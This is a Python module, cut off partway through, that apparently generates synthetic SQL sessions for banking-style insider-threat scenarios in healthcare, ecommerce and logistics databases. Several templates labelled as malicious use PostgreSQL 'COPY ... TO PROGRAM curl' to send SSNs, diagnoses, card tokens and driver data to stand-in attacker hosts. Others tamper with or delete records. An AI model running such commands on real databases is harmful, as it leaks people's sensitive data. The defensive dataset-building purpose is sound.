#!/usr/bin/env python3
"""Domain-specific knowledge module for multi-domain CASCE scenario generation.

Provides structured domain models (tables, columns, roles, SQL generators) for
banking, healthcare, ecommerce, and logistics domains. Used by generate_batch_v2.py
to produce domain-correct scenario specs.

Each domain mirrors the banking template structure:
  - frontline_role:   teller / nurse / support_agent / dispatcher
  - senior_role:      branch_manager / physician / catalog_manager / fleet_manager
  - audit_role:       compliance_officer / him_officer / fraud_analyst / compliance_auditor
  - etl_role:         batch_etl_service / research_etl_service / analytics_etl_service / partner_etl_service
"""

from __future__ import annotations

import random
import string
from typing import Any, Dict, List, Tuple

try:
    from generator_diversity import (
        get_diverse_external_endpoint,
        get_diverse_internal_endpoint,
        get_benign_external_endpoint,
        generate_exfil_command,
        generate_staging_command,
        generate_cleanup_command,
        generate_log_tampering_commands,
        build_semantic_family_id,
        vary_sql_query,
    )
except ImportError:
    from datagen.generator_diversity import (
        get_diverse_external_endpoint,
        get_diverse_internal_endpoint,
        get_benign_external_endpoint,
        generate_exfil_command,
        generate_staging_command,
        generate_cleanup_command,
        generate_log_tampering_commands,
        build_semantic_family_id,
        vary_sql_query,
    )

# ============================================================================
# Dynamic fallback infrastructure (shared across all domains)
# ============================================================================

def get_external_dest(rng: random.Random) -> Tuple[str, int]:
    return get_diverse_external_endpoint(rng)

def get_internal_dest(rng: random.Random) -> Tuple[str, int]:
    return get_diverse_internal_endpoint(rng)


def _random_date_range(rng):
    month = rng.randint(1, 12)
    day = rng.randint(1, 28)
    return (f"2026-{month:02d}-{day:02d} 00:00:00",
            f"2026-{month:02d}-{day+1 if day < 28 else 1:02d} 00:00:00")


def _random_password(rng):
    return ''.join(rng.choices(string.ascii_letters + string.digits, k=10))


def _sql_in_list(items):
    """Build a SQL IN clause value string: 'a', 'b', 'c'"""
    return "', '".join(items)


# ============================================================================
# HEALTHCARE domain
# ============================================================================

HC_DEPT_IDS = [
    "DEPT-CARDIO", "DEPT-NEURO", "DEPT-ORTHO", "DEPT-PEDS",
    "DEPT-ONCOL", "DEPT-EMERG", "DEPT-SURG", "DEPT-PSYCH",
    "DEPT-DERM", "DEPT-RADIO", "DEPT-PATH", "DEPT-ICU",
]

def _hc_random_dept(rng):
    return rng.choice(HC_DEPT_IDS)

def _hc_random_patient_id(rng):
    return rng.randint(10000, 99999)

def _hc_random_doctor_id(rng):
    return rng.randint(100, 499)


def _hc_benign_nurse_queries(rng, n=None):
    """Generate 2-5 benign nurse queries — department-scoped patient care."""
    n = n or rng.randint(2, 5)
    dept = _hc_random_dept(rng)
    pool = [
        f"SELECT patient_id, full_name, phone FROM patients WHERE primary_doctor_id IN (SELECT doctor_id FROM doctors WHERE department_id = '{dept}') AND patient_id = {_hc_random_patient_id(rng)}",
        f"UPDATE appointments SET status = 'checked_in' WHERE appointment_id = {rng.randint(50000, 99999)} AND patient_id = {_hc_random_patient_id(rng)}",
        f"SELECT a.appointment_id, a.reason, a.appointment_time FROM appointments a WHERE a.patient_id = {_hc_random_patient_id(rng)} AND a.status = 'scheduled' ORDER BY a.appointment_time",
        f"SELECT p.prescription_id, p.drug_name, p.dosage FROM prescriptions p WHERE p.patient_id = {_hc_random_patient_id(rng)} ORDER BY p.issued_at DESC LIMIT 5",
        f"SELECT patient_id, full_name FROM patients WHERE primary_doctor_id = {_hc_random_doctor_id(rng)}",
        f"UPDATE patients SET phone = '555-{rng.randint(1000, 9999)}' WHERE patient_id = {_hc_random_patient_id(rng)}",
        f"SELECT a.appointment_id, p.full_name, a.reason FROM appointments a JOIN patients p ON p.patient_id = a.patient_id WHERE a.doctor_id = {_hc_random_doctor_id(rng)} AND a.appointment_time > NOW() - INTERVAL '1 day' ORDER BY a.appointment_time",
        f"SELECT COUNT(*) FROM appointments WHERE doctor_id = {_hc_random_doctor_id(rng)} AND status = 'scheduled' AND appointment_time > NOW()",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _hc_benign_physician_queries(rng, n=None):
    """Generate 2-4 benign physician queries — own patient panel."""
    n = n or rng.randint(2, 4)
    doc_id = _hc_random_doctor_id(rng)
    pool = [
        f"SELECT p.patient_id, p.full_name, m.diagnosis_code, m.recorded_at FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.doctor_id = {doc_id} ORDER BY m.recorded_at DESC",
        f"INSERT INTO medical_records (patient_id, doctor_id, diagnosis_code, diagnosis_notes, recorded_at) VALUES ({_hc_random_patient_id(rng)}, {doc_id}, 'J06.9', 'Upper respiratory infection, prescribed amoxicillin', NOW())",
        f"INSERT INTO prescriptions (patient_id, doctor_id, drug_name, dosage, issued_at) VALUES ({_hc_random_patient_id(rng)}, {doc_id}, 'Amoxicillin', '500mg TID x 10 days', NOW())",
        f"SELECT a.appointment_id, p.full_name, a.reason FROM appointments a JOIN patients p ON p.patient_id = a.patient_id WHERE a.doctor_id = {doc_id} AND a.status = 'scheduled' ORDER BY a.appointment_time",
        f"SELECT p.full_name, pr.drug_name, pr.dosage FROM patients p JOIN prescriptions pr ON pr.patient_id = p.patient_id WHERE pr.doctor_id = {doc_id} AND pr.issued_at > NOW() - INTERVAL '30 days'",
        f"SELECT COUNT(*) FROM appointments WHERE doctor_id = {doc_id} AND status = 'completed' AND appointment_time > NOW() - INTERVAL '7 days'",
        f"UPDATE appointments SET status = 'completed' WHERE appointment_id = {rng.randint(50000, 99999)} AND doctor_id = {doc_id}",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _hc_audit_queries(rng, n=None):
    """Generate 2-4 HIM officer audit queries — enterprise-wide sensitive reads."""
    n = n or rng.randint(2, 4)
    pool = [
        "SELECT p.ssn, p.date_of_birth, p.address, m.diagnosis_code FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.recorded_at > NOW() - INTERVAL '90 days'",
        f"SELECT p.patient_id, p.ssn, p.full_name, COUNT(m.record_id) FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id GROUP BY p.patient_id, p.ssn, p.full_name HAVING COUNT(m.record_id) > {rng.randint(5, 20)}",
        "SELECT DISTINCT p.ssn, p.address, p.phone, pr.drug_name FROM patients p JOIN prescriptions pr ON pr.patient_id = p.patient_id WHERE pr.drug_name IN ('Oxycodone', 'Hydrocodone', 'Fentanyl')",
        f"SELECT p.ssn, p.date_of_birth, b.amount, b.payment_status FROM patients p JOIN billing b ON b.patient_id = p.patient_id WHERE b.amount > {rng.randint(5000, 50000)}",
        "SELECT p.full_name, p.ssn, p.address, m.diagnosis_code, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.diagnosis_code LIKE 'F%' ORDER BY m.recorded_at DESC",
        f"SELECT p.patient_id, p.ssn, COUNT(DISTINCT m.doctor_id) as doctor_count FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id GROUP BY p.patient_id, p.ssn HAVING COUNT(DISTINCT m.doctor_id) > {rng.randint(3, 8)}",
    ]
    return [rng.choice(pool) for _ in range(n)]


# ============================================================================
# ECOMMERCE domain
# ============================================================================

EC_CATEGORIES = [
    "Electronics", "Clothing", "Books", "Home & Garden", "Sports",
    "Toys", "Beauty", "Food", "Automotive", "Jewelry",
]

def _ec_random_customer_id(rng):
    return rng.randint(10000, 99999)

def _ec_random_order_id(rng):
    return rng.randint(80000, 99999)

def _ec_random_product_id(rng):
    return rng.randint(1000, 9999)


def _ec_benign_support_queries(rng, n=None):
    """Generate 2-5 benign support agent queries — per-customer ticket handling."""
    n = n or rng.randint(2, 5)
    cust_id = _ec_random_customer_id(rng)
    pool = [
        f"SELECT order_id, order_time, total_amount, status FROM orders WHERE customer_id = {cust_id} ORDER BY order_time DESC LIMIT 5",
        f"SELECT c.full_name, c.email FROM customers c WHERE c.customer_id = {cust_id}",
        f"UPDATE orders SET status = 'refunded' WHERE order_id = {_ec_random_order_id(rng)} AND customer_id = {cust_id}",
        f"SELECT oi.product_id, p.name, oi.quantity, oi.unit_price FROM order_items oi JOIN products p ON p.product_id = oi.product_id WHERE oi.order_id = {_ec_random_order_id(rng)}",
        f"SELECT o.order_id, o.status, o.total_amount FROM orders o WHERE o.customer_id = {cust_id} AND o.status = 'shipped'",
        f"UPDATE orders SET status = 'returned' WHERE order_id = {_ec_random_order_id(rng)} AND customer_id = {cust_id}",
        f"SELECT c.full_name, c.email, c.shipping_address FROM customers c WHERE c.customer_id = {cust_id}",
        f"SELECT COUNT(*) FROM orders WHERE customer_id = {cust_id} AND order_time > NOW() - INTERVAL '30 days'",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _ec_benign_catalog_queries(rng, n=None):
    """Generate 2-4 benign catalog manager queries — product inventory."""
    n = n or rng.randint(2, 4)
    cat = rng.choice(EC_CATEGORIES)
    pool = [
        f"SELECT product_id, name, price, stock_qty FROM products WHERE category = '{cat}' ORDER BY stock_qty ASC",
        f"UPDATE products SET price = {rng.randint(10, 500)}.99 WHERE product_id = {_ec_random_product_id(rng)}",
        f"UPDATE products SET stock_qty = stock_qty + {rng.randint(50, 500)} WHERE product_id = {_ec_random_product_id(rng)}",
        f"SELECT category, COUNT(*), AVG(price) FROM products GROUP BY category ORDER BY COUNT(*) DESC",
        f"SELECT p.product_id, p.name, SUM(oi.quantity) as total_sold FROM products p JOIN order_items oi ON oi.product_id = p.product_id WHERE p.category = '{cat}' GROUP BY p.product_id, p.name ORDER BY total_sold DESC LIMIT 20",
        f"SELECT product_id, name, stock_qty FROM products WHERE stock_qty < {rng.randint(5, 20)} AND category = '{cat}'",
        f"SELECT p.name, p.category, COUNT(oi.order_item_id) as order_count FROM products p JOIN order_items oi ON oi.product_id = p.product_id GROUP BY p.name, p.category HAVING COUNT(oi.order_item_id) > {rng.randint(50, 200)} ORDER BY order_count DESC",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _ec_fraud_audit_queries(rng, n=None):
    """Generate 2-4 fraud analyst queries — enterprise-wide sensitive reads."""
    n = n or rng.randint(2, 4)
    pool = [
        f"SELECT c.email, c.phone, c.shipping_address, o.total_amount, pay.card_last4 FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id WHERE o.total_amount > {rng.randint(1000, 5000)}",
        "SELECT c.customer_id, c.email, c.shipping_address, COUNT(o.order_id) as order_count, SUM(o.total_amount) as total_spent FROM customers c JOIN orders o ON o.customer_id = c.customer_id GROUP BY c.customer_id, c.email, c.shipping_address HAVING SUM(o.total_amount) > 10000",
        f"SELECT DISTINCT c.email, c.phone, pay.card_last4, pay.amount FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id WHERE pay.amount > {rng.randint(500, 3000)} AND o.order_time > NOW() - INTERVAL '7 days'",
        "SELECT c.full_name, c.email, c.shipping_address, COUNT(DISTINCT pay.card_last4) as card_count FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id GROUP BY c.full_name, c.email, c.shipping_address HAVING COUNT(DISTINCT pay.card_last4) > 3",
        f"SELECT c.customer_id, c.email, c.phone, o.order_id, o.total_amount, o.status FROM customers c JOIN orders o ON o.customer_id = c.customer_id WHERE o.status = 'flagged' ORDER BY o.total_amount DESC",
        "SELECT c.email, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id WHERE pay.paid_at > NOW() - INTERVAL '24 hours' ORDER BY pay.amount DESC",
    ]
    return [rng.choice(pool) for _ in range(n)]


# ============================================================================
# LOGISTICS domain
# ============================================================================

LG_DEPOT_IDS = [
    "DEPOT-NORTH", "DEPOT-SOUTH", "DEPOT-EAST", "DEPOT-WEST",
    "DEPOT-CENTRAL", "DEPOT-PORT", "DEPOT-RAIL", "DEPOT-AIR",
    "DEPOT-HUB-1", "DEPOT-HUB-2", "DEPOT-COLD", "DEPOT-HAZMAT",
]

LG_REGIONS = ["NORTH", "SOUTH", "EAST", "WEST", "CENTRAL"]

def _lg_random_depot(rng):
    return rng.choice(LG_DEPOT_IDS)

def _lg_random_driver_id(rng):
    return rng.randint(1000, 4999)

def _lg_random_shipment_id(rng):
    return rng.randint(50000, 99999)

def _lg_random_warehouse_id(rng):
    return rng.randint(100, 299)


def _lg_benign_dispatcher_queries(rng, n=None):
    """Generate 2-5 benign dispatcher queries — depot-scoped operations."""
    n = n or rng.randint(2, 5)
    depot = _lg_random_depot(rng)
    pool = [
        f"SELECT s.shipment_id, s.status, s.dest_address, d.full_name FROM shipments s JOIN drivers d ON d.driver_id = s.driver_id WHERE d.depot_id = '{depot}' AND s.status = 'pending' ORDER BY s.dispatched_at",
        f"UPDATE shipments SET status = 'dispatched', driver_id = {_lg_random_driver_id(rng)} WHERE shipment_id = {_lg_random_shipment_id(rng)}",
        f"SELECT v.vehicle_id, v.plate_number, v.capacity_kg FROM vehicles v WHERE v.depot_id = '{depot}' AND v.vehicle_id NOT IN (SELECT vehicle_id FROM shipments WHERE status = 'in_transit')",
        f"SELECT d.driver_id, d.full_name, COUNT(s.shipment_id) as active_shipments FROM drivers d LEFT JOIN shipments s ON s.driver_id = d.driver_id AND s.status = 'in_transit' WHERE d.depot_id = '{depot}' GROUP BY d.driver_id, d.full_name",
        f"UPDATE shipments SET status = 'delivered' WHERE shipment_id = {_lg_random_shipment_id(rng)}",
        f"SELECT s.shipment_id, s.dispatched_at, v.plate_number FROM shipments s JOIN vehicles v ON v.vehicle_id = s.vehicle_id WHERE s.driver_id = {_lg_random_driver_id(rng)} AND s.status = 'in_transit'",
        f"SELECT d.full_name, d.phone FROM drivers d WHERE d.depot_id = '{depot}' AND d.driver_id = {_lg_random_driver_id(rng)}",
        f"SELECT COUNT(*) FROM shipments WHERE origin_warehouse_id IN (SELECT warehouse_id FROM warehouses WHERE manager_id IN (SELECT driver_id FROM drivers WHERE depot_id = '{depot}')) AND status = 'pending'",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _lg_benign_fleet_queries(rng, n=None):
    """Generate 2-4 benign fleet manager queries — regional capacity planning."""
    n = n or rng.randint(2, 4)
    region = rng.choice(LG_REGIONS)
    depots = rng.sample(LG_DEPOT_IDS, min(rng.randint(2, 4), len(LG_DEPOT_IDS)))
    depot_list = "', '".join(depots)
    pool = [
        f"SELECT v.depot_id, COUNT(*), SUM(v.capacity_kg) FROM vehicles v WHERE v.depot_id IN ('{depot_list}') GROUP BY v.depot_id",
        f"SELECT d.depot_id, d.full_name, COUNT(s.shipment_id) as shipment_count FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id WHERE d.depot_id IN ('{depot_list}') AND s.dispatched_at > NOW() - INTERVAL '30 days' GROUP BY d.depot_id, d.full_name ORDER BY shipment_count DESC",
        f"SELECT s.origin_warehouse_id, COUNT(*), AVG(m.weight_kg) FROM shipments s JOIN manifests m ON m.shipment_id = s.shipment_id WHERE s.status = 'delivered' AND s.dispatched_at > NOW() - INTERVAL '30 days' GROUP BY s.origin_warehouse_id",
        f"SELECT v.model, COUNT(*), AVG(v.capacity_kg) FROM vehicles v WHERE v.depot_id IN ('{depot_list}') GROUP BY v.model ORDER BY COUNT(*) DESC",
        f"SELECT DATE(s.dispatched_at), COUNT(s.shipment_id), SUM(m.weight_kg) FROM shipments s JOIN manifests m ON m.shipment_id = s.shipment_id WHERE s.dispatched_at > NOW() - INTERVAL '30 days' GROUP BY DATE(s.dispatched_at) ORDER BY DATE(s.dispatched_at)",
    ]
    return [rng.choice(pool) for _ in range(n)]


def _lg_audit_queries(rng, n=None):
    """Generate 2-4 compliance auditor queries — enterprise-wide sensitive reads."""
    n = n or rng.randint(2, 4)
    pool = [
        "SELECT d.license_number, d.home_address, d.phone, s.dest_address FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id WHERE s.dispatched_at > NOW() - INTERVAL '90 days'",
        f"SELECT d.driver_id, d.license_number, d.home_address, COUNT(s.shipment_id) FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id GROUP BY d.driver_id, d.license_number, d.home_address HAVING COUNT(s.shipment_id) > {rng.randint(20, 100)}",
        f"SELECT s.dest_address, m.declared_value, m.description FROM shipments s JOIN manifests m ON m.shipment_id = s.shipment_id WHERE m.declared_value > {rng.randint(10000, 100000)}",
        "SELECT DISTINCT d.license_number, d.full_name, d.home_address, d.phone FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id WHERE s.status = 'delayed' OR s.status = 'lost'",
        f"SELECT d.license_number, d.home_address, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE m.declared_value > {rng.randint(50000, 200000)} ORDER BY m.declared_value DESC",
        "SELECT w.name, w.location, COUNT(s.shipment_id) as total_shipments, SUM(m.declared_value) as total_value FROM warehouses w JOIN shipments s ON s.origin_warehouse_id = w.warehouse_id JOIN manifests m ON m.shipment_id = s.shipment_id GROUP BY w.name, w.location ORDER BY total_value DESC",
    ]
    return [rng.choice(pool) for _ in range(n)]


# ============================================================================
# Domain configuration registry
# ============================================================================

DOMAIN_CONFIG = {
    "healthcare": {
        "domain": "healthcare",
        "sensitive_pii_table": "patients",
        "sensitive_columns": ["ssn", "date_of_birth", "address", "phone"],
        "all_tables": ["patients", "doctors", "appointments", "medical_records", "prescriptions", "billing"],
        "frontline_role": "nurse",
        "senior_role": "physician",
        "audit_role": "him_officer",
        "etl_role": "research_etl_service",
        "scope_ids": HC_DEPT_IDS,
        "scope_name": "department",
        "scope_column": "department_id",
        "benign_frontline_queries": _hc_benign_nurse_queries,
        "benign_senior_queries": _hc_benign_physician_queries,
        "audit_queries": _hc_audit_queries,
        # PII dump SQL (frontline stealing sensitive data cross-scope)
        "pii_dump_sql": lambda rng, dept: f"SELECT ssn, address, full_name, date_of_birth FROM patients WHERE primary_doctor_id NOT IN (SELECT doctor_id FROM doctors WHERE department_id = '{dept}')",
        "pii_exfil_copy": lambda rng: "COPY (SELECT p.ssn, p.address, p.date_of_birth, p.phone FROM patients p) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'",
        # ETL scoped vs broad
        "etl_scoped_copy": lambda rng, start, end: f"COPY (SELECT patient_id, diagnosis_code, record_id FROM medical_records WHERE recorded_at > '{start}' AND recorded_at <= '{end}') TO PROGRAM 'curl -sX POST https://warehouse.internal.example/replicate -d @-'",
        "etl_broad_copy": lambda rng: "COPY (SELECT p.ssn, p.address, p.date_of_birth, m.diagnosis_code, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
        # Audit export (benign compliance)
        "audit_export_copy": "COPY (SELECT p.ssn, p.full_name, m.diagnosis_code FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.recorded_at > NOW() - INTERVAL '90 days') TO PROGRAM 'cat > /var/lib/postgresql/audit/hipaa_compliance_report.csv'",
        # Senior role benign report
        "senior_report_copy": lambda rng, scope_id: f"COPY (SELECT a.appointment_id, p.full_name, a.reason FROM appointments a JOIN patients p ON p.patient_id = a.patient_id WHERE a.doctor_id IN (SELECT doctor_id FROM doctors WHERE department_id = '{scope_id}') AND a.appointment_time > NOW() - INTERVAL '1 day') TO PROGRAM 'cat > /var/lib/postgresql/reports/dept_{scope_id}_daily.csv'",
        # Audit exfil (malicious — false negative)
        "audit_exfil_copy": lambda rng: "COPY (SELECT p.ssn, p.address, p.date_of_birth, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'",
        # APT broad select
        "apt_broad_select": "SELECT ssn, address, date_of_birth, phone, full_name FROM patients",
        "apt_exfil_copy": lambda rng: "COPY (SELECT p.ssn, p.address, p.date_of_birth, p.phone FROM patients p) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'",
        # Batch report (benign ETL scheduled)
        "batch_report_queries": lambda rng, scope_id, start, end: [
            f"SELECT d.department_id, d.specialty, COUNT(a.appointment_id) FROM doctors d JOIN appointments a ON a.doctor_id = d.doctor_id WHERE d.department_id = '{scope_id}' AND a.appointment_time > '{start}' GROUP BY d.department_id, d.specialty",
            f"SELECT COUNT(m.record_id), COUNT(DISTINCT m.patient_id) FROM medical_records m JOIN doctors d ON d.doctor_id = m.doctor_id WHERE d.department_id = '{scope_id}' AND m.recorded_at > '{start}' AND m.recorded_at <= '{end}'",
        ],
        "batch_report_copy": lambda rng, scope_id: f"COPY (SELECT d.department_id, COUNT(a.appointment_id) FROM doctors d JOIN appointments a ON a.doctor_id = d.doctor_id WHERE d.department_id = '{scope_id}' GROUP BY d.department_id) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
        # Cross-scope senior benign
        "cross_scope_queries": lambda rng, scope_ids: [
            f"SELECT d.department_id, COUNT(a.appointment_id), COUNT(DISTINCT a.patient_id) FROM doctors d JOIN appointments a ON a.doctor_id = d.doctor_id WHERE d.department_id IN ('{_sql_in_list(scope_ids)}') GROUP BY d.department_id",
            f"SELECT p.full_name, m.diagnosis_code, d.department_id FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id JOIN doctors d ON d.doctor_id = m.doctor_id WHERE d.department_id IN ('{_sql_in_list(scope_ids)}') AND m.recorded_at > NOW() - INTERVAL '7 days'",
        ],
        "cross_scope_copy": lambda rng, scope_ids: f"COPY (SELECT d.department_id, COUNT(a.appointment_id), COUNT(DISTINCT a.patient_id) FROM doctors d JOIN appointments a ON a.doctor_id = d.doctor_id WHERE d.department_id IN ('{_sql_in_list(scope_ids)}') GROUP BY d.department_id) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
        # Data tampering
        "tamper_update": lambda rng: f"UPDATE patients SET address = '123 Fake St' WHERE patient_id = {_hc_random_patient_id(rng)}",
        "tamper_delete": lambda rng: f"DELETE FROM medical_records WHERE patient_id = {_hc_random_patient_id(rng)} AND diagnosis_code LIKE 'F%'",
        # Lateral movement
        "lateral_broad_select": lambda rng: "SELECT ssn, address, date_of_birth, full_name FROM patients",
        "lateral_secondary_select": lambda rng: f"SELECT record_id, diagnosis_code, diagnosis_notes, patient_id FROM medical_records WHERE recorded_at > NOW() - INTERVAL '30 days'",
        "lateral_exfil_copy": lambda rng: "COPY (SELECT p.ssn, p.address, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'",
        # Hard neg ETL internal
        "hard_neg_etl_copy": lambda rng, scope_id, start, end: f"COPY (SELECT p.ssn, m.diagnosis_code, m.patient_id FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.doctor_id IN (SELECT doctor_id FROM doctors WHERE department_id = '{scope_id}')) TO PROGRAM 'curl -sX POST https://replica.internal.example/sync -d @-'",
        # Frontline benign COPY (daily report)
        "frontline_report_copy": lambda rng, scope_id: f"COPY (SELECT a.appointment_id, a.patient_id, a.status FROM appointments a WHERE a.doctor_id IN (SELECT doctor_id FROM doctors WHERE department_id = '{scope_id}') AND a.appointment_time > NOW() - INTERVAL '1 day') TO PROGRAM 'cat > /var/lib/postgresql/reports/dept_{scope_id}_daily.csv'",
    },

    "ecommerce": {
        "domain": "ecommerce",
        "sensitive_pii_table": "customers",
        "sensitive_columns": ["email", "phone", "shipping_address", "card_last4", "card_token"],
        "all_tables": ["customers", "products", "orders", "order_items", "payments"],
        "frontline_role": "support_agent",
        "senior_role": "catalog_manager",
        "audit_role": "fraud_analyst",
        "etl_role": "analytics_etl_service",
        "scope_ids": [f"TICKET-{i:04d}" for i in range(1, 16)],
        "scope_name": "customer",
        "scope_column": "customer_id",
        "benign_frontline_queries": _ec_benign_support_queries,
        "benign_senior_queries": _ec_benign_catalog_queries,
        "audit_queries": _ec_fraud_audit_queries,
        "pii_dump_sql": lambda rng, scope: f"SELECT email, phone, shipping_address, full_name FROM customers WHERE created_at > NOW() - INTERVAL '365 days'",
        "pii_exfil_copy": lambda rng: "COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'",
        "etl_scoped_copy": lambda rng, start, end: f"COPY (SELECT order_id, total_amount, status FROM orders WHERE order_time > '{start}' AND order_time <= '{end}') TO PROGRAM 'curl -sX POST https://warehouse.internal.example/replicate -d @-'",
        "etl_broad_copy": lambda rng: "COPY (SELECT c.email, c.shipping_address, pay.card_last4, pay.card_token, pay.amount FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
        "audit_export_copy": "COPY (SELECT c.email, c.phone, o.total_amount, pay.card_last4 FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id WHERE o.total_amount > 1000) TO PROGRAM 'cat > /var/lib/postgresql/audit/fraud_review_report.csv'",
        "senior_report_copy": lambda rng, scope_id: f"COPY (SELECT p.product_id, p.name, p.price, p.stock_qty FROM products p WHERE p.category = '{rng.choice(EC_CATEGORIES)}') TO PROGRAM 'cat > /var/lib/postgresql/reports/catalog_update.csv'",
        "audit_exfil_copy": lambda rng: "COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'",
        "apt_broad_select": "SELECT email, phone, shipping_address, full_name FROM customers",
        "apt_exfil_copy": lambda rng: "COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'",
        "batch_report_queries": lambda rng, scope_id, start, end: [
            f"SELECT p.category, COUNT(oi.order_item_id), SUM(oi.quantity) FROM products p JOIN order_items oi ON oi.product_id = p.product_id JOIN orders o ON o.order_id = oi.order_id WHERE o.order_time > '{start}' AND o.order_time <= '{end}' GROUP BY p.category",
            f"SELECT COUNT(o.order_id), SUM(o.total_amount) FROM orders o WHERE o.order_time > '{start}' AND o.order_time <= '{end}' AND o.status = 'completed'",
        ],
        "batch_report_copy": lambda rng, scope_id: f"COPY (SELECT p.category, COUNT(*), SUM(oi.quantity * oi.unit_price) FROM products p JOIN order_items oi ON oi.product_id = p.product_id GROUP BY p.category) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
        "cross_scope_queries": lambda rng, scope_ids: [
            f"SELECT p.category, COUNT(*), SUM(oi.quantity) FROM products p JOIN order_items oi ON oi.product_id = p.product_id GROUP BY p.category ORDER BY SUM(oi.quantity) DESC",
            f"SELECT c.full_name, SUM(o.total_amount), COUNT(o.order_id) FROM customers c JOIN orders o ON o.customer_id = c.customer_id WHERE o.order_time > NOW() - INTERVAL '30 days' GROUP BY c.full_name ORDER BY SUM(o.total_amount) DESC LIMIT 50",
        ],
        "cross_scope_copy": lambda rng, scope_ids: f"COPY (SELECT p.category, COUNT(*), SUM(oi.quantity), SUM(oi.unit_price * oi.quantity) FROM products p JOIN order_items oi ON oi.product_id = p.product_id GROUP BY p.category) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
        "tamper_update": lambda rng: f"UPDATE customers SET shipping_address = '123 Fake St, Nowhere' WHERE customer_id = {_ec_random_customer_id(rng)}",
        "tamper_delete": lambda rng: f"DELETE FROM orders WHERE order_id = {_ec_random_order_id(rng)} AND total_amount > {rng.randint(1000, 5000)}",
        "lateral_broad_select": lambda rng: "SELECT email, phone, shipping_address, full_name FROM customers",
        "lateral_secondary_select": lambda rng: f"SELECT order_id, total_amount, customer_id FROM orders WHERE total_amount > {rng.randint(500, 3000)}",
        "lateral_exfil_copy": lambda rng: "COPY (SELECT c.email, c.shipping_address, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'",
        "hard_neg_etl_copy": lambda rng, scope_id, start, end: f"COPY (SELECT c.email, o.total_amount, o.order_id FROM customers c JOIN orders o ON o.customer_id = c.customer_id WHERE o.order_time > '{start}' AND o.order_time <= '{end}') TO PROGRAM 'curl -sX POST https://replica.internal.example/sync -d @-'",
        "frontline_report_copy": lambda rng, scope_id: f"COPY (SELECT o.order_id, o.status, o.total_amount FROM orders o WHERE o.customer_id = {_ec_random_customer_id(rng)} AND o.order_time > NOW() - INTERVAL '7 days') TO PROGRAM 'cat > /var/lib/postgresql/reports/support_escalation.csv'",
    },

    "logistics": {
        "domain": "logistics",
        "sensitive_pii_table": "drivers",
        "sensitive_columns": ["license_number", "phone", "home_address", "dest_address", "declared_value"],
        "all_tables": ["drivers", "vehicles", "warehouses", "shipments", "manifests"],
        "frontline_role": "dispatcher",
        "senior_role": "fleet_manager",
        "audit_role": "compliance_auditor",
        "etl_role": "partner_etl_service",
        "scope_ids": LG_DEPOT_IDS,
        "scope_name": "depot",
        "scope_column": "depot_id",
        "benign_frontline_queries": _lg_benign_dispatcher_queries,
        "benign_senior_queries": _lg_benign_fleet_queries,
        "audit_queries": _lg_audit_queries,
        "pii_dump_sql": lambda rng, scope: f"SELECT license_number, home_address, phone, full_name FROM drivers WHERE depot_id != '{scope}'",
        "pii_exfil_copy": lambda rng: "COPY (SELECT d.license_number, d.home_address, d.phone FROM drivers d) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'",
